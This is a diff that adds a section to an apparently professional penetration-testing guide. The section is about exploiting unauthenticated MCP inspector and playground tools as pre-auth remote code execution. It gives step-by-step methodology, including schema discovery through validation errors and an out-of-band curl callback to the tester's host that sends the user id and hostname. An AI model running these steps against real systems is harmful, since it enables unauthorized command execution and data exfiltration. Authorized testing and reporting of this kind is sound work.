@@ -45,6 +45,43 @@ that exposes `POST /tools` (or equivalent) taking a `code`/`command` field is
 RCE by design; the only question is authorization. Enumerate `tools/list` first
 (often unauthenticated), then look at how registration is gated.
 
+## MCP *clients*: inspectors, playgrounds and desktop bridges
+
+The client side of MCP is the softer target, and it is easy to walk past because
+it looks like a UI rather than a service. An MCP inspector/debugger exists to
+**connect to servers you nominate**, and the dominant MCP transport is stdio —
+so its core function is *spawning a process from caller-supplied configuration*.
+Exposed without authentication, that is not a bug being exploited, it is the
+tool being asked politely. Treat any of these as pre-auth RCE until proven
+otherwise:
+
+- an inspector/debugger UI (MCPJam Inspector, the reference MCP Inspector, IDE
+  bridges), a "connect to your MCP server" playground, or an agent builder that
+  lets a *profile* name a command;
+- anything whose config schema has `command` + `args`, or `transport: "stdio"`.
+
+**How to work one:**
+
+1. Fingerprint from the SPA shell — `/app.webmanifest`, the `<title>`, an asset
+   hash — then pin the version and enumerate the CVE set for it.
+2. **Let the endpoint teach you its schema.** POST `{}` and walk the validation
+   errors; these apps answer one missing field at a time
+   (`serverConfig is required` → `serverId is required` → …). Cheaper and more
+   reliable than guessing the body from the client bundle.
+3. The success signal is counter-intuitive: a non-MCP binary spawns, writes to
+   stdout and exits, so the handshake fails and you get something like
+   `MCP error -32000: Connection closed`. **That error means your command ran.**
+   A protocol error is not an authorization failure — read it as execution and
+   confirm out of band.
+4. Confirm with an out-of-band callback that carries identity
+   (`curl http://<tun0>:<port>/oob-$(id -u)-$(hostname)`) before building
+   anything on top of it.
+
+Note for the report: these tools bind `0.0.0.0` by default and ship with no auth
+because they are meant to be local and single-user. The defect is almost always
+the reverse proxy or port forward that published them, not the tool — say so, and
+name the server block.
+
 ## Model/inference servers and RAG
 
 - **Ollama** (`11434`), **vLLM**, **LocalAI**, **text-generation-webui** — often
